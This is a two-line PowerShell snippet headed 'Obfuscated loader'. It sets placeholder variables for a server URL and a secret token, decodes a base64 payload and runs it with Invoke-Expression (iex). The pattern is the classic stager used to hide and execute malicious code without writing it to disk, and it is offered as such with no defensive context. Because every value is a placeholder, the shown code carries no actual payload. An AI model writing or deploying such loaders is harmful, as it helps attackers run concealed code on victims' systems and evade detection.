# Obfuscated loader
$s1='SERVER_URL_PLACEHOLDER';$s2='SECRET_TOKEN_PLACEHOLDER';$d=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PAYLOAD_BASE64'));iex $d

